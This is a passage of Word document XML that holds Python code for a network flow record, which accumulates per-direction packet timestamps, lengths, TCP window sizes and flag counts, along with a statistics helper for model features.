          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DF0C3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    init_win_fwd: int = -1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F8219D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    init_win_bwd: int = -1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5718EF4A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    act_data_fwd: int = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A36626">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    min_seg_fwd: int = -1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7CE346">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    finished: bool = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13CDE9F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A14AAE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def add(self, rec: PacketRecord, forward: bool) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB8BB7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.last = rec.ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A37A74">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if forward:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09312D19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.fwd_ts.append(rec.ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30666305">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.fwd_len.append(rec.payload_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1A570A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.fwd_hdr += rec.header_len</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089E99A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self.init_win_fwd &lt; 0 and rec.tcp_window &gt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44759D23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.init_win_fwd = rec.tcp_window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713D4CC8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if rec.payload_len &gt; 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5337409B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.act_data_fwd += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D0A568">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if rec.tcp_header_len &gt; 0 and (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139B6A14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.min_seg_fwd &lt; 0 or rec.tcp_header_len &lt; self.min_seg_fwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287CB66A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF5E72C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.min_seg_fwd = rec.tcp_header_len</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4608F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C72F4D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.bwd_ts.append(rec.ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200773D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.bwd_len.append(rec.payload_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E4EE36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.bwd_hdr += rec.header_len</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F7CB20">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self.init_win_bwd &lt; 0 and rec.tcp_window &gt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DA65BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.init_win_bwd = rec.tcp_window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABCD60C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39CC85B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f = rec.tcp_flags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BBE3076">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if f &amp; FIN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124FF618">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["fin"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3694A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.finished = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591354CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if f &amp; SYN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9B8666">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["syn"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0094E6A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if f &amp; RST:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E72A21A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["rst"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9F9DDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.finished = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5C617B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if f &amp; PSH:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313B4250">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["psh"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCFE647">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["fwd_psh" if forward else "bwd_psh"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAD41BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if f &amp; ACK:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0422EDFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["ack"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346A52AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if f &amp; URG:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33598E7E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["urg"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C6B481">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["fwd_urg" if forward else "bwd_urg"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0400CE31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if f &amp; ECE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3423BBB4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["ece"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2372DAFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if f &amp; CWR:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BA8A58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flags["cwr"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E79CFAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42912934">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A4D4987">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _stats(values: list) -&gt; tuple:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6518A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """返回 (mean, std, max, min)。空列表返回全 0，避免 nan 进模型。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBDF905">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n = len(values)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4391CD76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if n == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4160447C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return 0.0, 0.0, 0.0, 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6376EB3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    mean = sum(values) / n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F0EA886">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
